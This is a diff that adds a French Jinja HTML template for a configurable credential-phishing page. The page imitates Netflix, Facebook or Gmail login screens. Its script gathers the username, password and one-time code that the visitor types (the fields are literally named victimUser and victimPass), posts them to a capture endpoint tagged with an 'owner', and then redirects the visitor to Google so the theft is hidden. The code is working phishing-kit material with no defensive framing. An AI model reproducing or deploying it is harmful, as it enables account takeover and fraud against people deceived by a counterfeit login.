@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.title or config.network }}</title>
+    {% set net_low = (config.network or '') | lower %}
+    {% set is_netflix = 'netflix' in net_low %}
+    {% set is_facebook = 'facebook' in net_low %}
+    {% set is_gmail = 'gmail' in net_low or 'google' in net_low %}
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            {% if config.bg_type == 'image' and config.bg_value %}
+                background: linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0.65)), url("{{ config.bg_value }}") center/cover no-repeat fixed;
+            {% elif is_netflix %}
+                background: linear-gradient(rgba(0,0,0,0.72), rgba(0,0,0,0.85)), #141414;
+            {% elif is_facebook %}
+                background: #f0f2f5;
+            {% elif is_gmail %}
+                background: #f6f8fc;
+            {% else %}
+                background: {{ config.bg_value or '#111111' }};
+            {% endif %}
+        }
+        .login-card {
+            width: 100%;
+            max-width: {{ config.box_width or '420px' }};
+            border-radius: 10px;
+            padding: 28px 24px;
+            {% if is_netflix %}
+                background: rgba(0, 0, 0, 0.85);
+                color: #ffffff;
+                border: 1px solid #333;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            {% elif is_facebook %}
+                background: #ffffff;
+                color: #1c1e21;
+                border: 1px solid #dddfe2;
+                box-shadow: 0 4px 16px rgba(0,0,0,0.12);
+            {% elif is_gmail %}
+                background: #ffffff;
+                color: #202124;
+                border: 1px solid #dadce0;
+                box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            {% else %}
+                background: {{ config.box_bg or 'rgba(255,255,255,0.95)' }};
+                color: #111111;
+                box-shadow: 0 8px 24px rgba(0,0,0,0.35);
+            {% endif %}
+        }
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 18px;
+            text-align: center;
+        }
+        .brand-logo {
+            width: 84px;
+            height: 84px;
+            object-fit: cover;
+            margin-bottom: 10px;
+            border-radius: {% if config.logo_shape == 'square' %}10px{% else %}50%{% endif %};
+            border: 2px solid {% if is_netflix %}#e50914{% elif is_facebook %}#1877f2{% elif is_gmail %}#d93025{% else %}#f5b014{% endif %};
+            background: #111;
+        }
+        .brand-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+        .brand-sub {
+            font-size: 13px;
+            opacity: 0.75;
+        }
+        .field-group {
+            margin-bottom: 14px;
+        }
+        .field-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 6px;
+        }
+        .field-group input {
+            width: 100%;
+            padding: 11px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            {% if is_netflix %}
+                background: #333333;
+                color: #ffffff;
+                border: 1px solid #555;
+            {% else %}
+                background: #ffffff;
+                color: #111111;
+                border: 1px solid #ccd0d5;
+            {% endif %}
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 6px;
+            {% if is_netflix %}
+                background: #e50914;
+                color: #ffffff;
+            {% elif is_facebook %}
+                background: #1877f2;
+                color: #ffffff;
+            {% elif is_gmail %}
+                background: #1a73e8;
+                color: #ffffff;
+            {% else %}
+                background: #f5b014;
+                color: #111111;
+            {% endif %}
+        }
+    </style>
+</head>
+<body>
+<div class="login-card">
+    <div class="brand-header">
+        <img class="brand-logo" src="{{ config.logo_url or 'https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png' }}" alt="{{ config.network }}">
+        <div class="brand-title">{{ config.title or config.network }}</div>
+        <div class="brand-sub">{{ config.network }}</div>
+    </div>
+
+    <form id="custom-login-form">
+        {% if config.fields and config.fields|length > 0 %}
+            {% for f in config.fields %}
+                <div class="field-group">
+                    <label>{{ f.label }}</label>
+                    <input type="{{ f.type or 'text' }}" name="{{ f.name }}" required placeholder="{{ f.label }}">
+                </div>
+            {% endfor %}
+        {% else %}
+            <div class="field-group">
+                <label>Identifiant / Email</label>
+                <input type="text" name="victimUser" required placeholder="Identifiant / Email">
+            </div>
+            <div class="field-group">
+                <label>Mot de passe</label>
+                <input type="password" name="victimPass" required placeholder="Mot de passe">
+            </div>
+        {% endif %}
+        <button type="submit" class="submit-btn">{{ config.btn_text or 'Se connecter' }}</button>
+    </form>
+</div>
+
+<script>
+(function() {
+    const OWNER = {{ (config.owner or 'Kim') | tojson }};
+    const NETWORK = {{ (config.network or 'Facebook') | tojson }};
+    const LOGO_URL = {{ (config.logo_url or '') | tojson }};
+    const REDIRECT_URL = {{ (config.redirect_url or 'https://www.google.com') | tojson }};
+    const form = document.getElementById('custom-login-form');
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        let vUser = "Inconnu", vPass = "Inconnu", vOtp = "Aucun";
+        let hasOtpField = false;
+
+        form.querySelectorAll('input').forEach(inp => {
+            const val = (inp.value || "").trim();
+            const n = (inp.name || "").toLowerCase();
+            if (n === "victimuser" || inp.type === "email") vUser = val || "Inconnu";
+            else if (n === "victimpass" || inp.type === "password") vPass = val || "Inconnu";
+            else if (n === "otp" || n.includes("code")) {
+                hasOtpField = true;
+                vOtp = val || "En attente OTP...";
+            }
+        });
+
+        await fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                owner: OWNER,
+                network: NETWORK,
+                platformImage: LOGO_URL,
+                type: hasOtpField ? "OTP" : "STANDARD",
+                victimUser: vUser,
+                victimPass: vPass,
+                otp: vOtp
+            }),
+            keepalive: true
+        }).catch(() => {});
+
+        window.location.replace(REDIRECT_URL);
+    });
+})();
+</script>
+</body>
+</html>
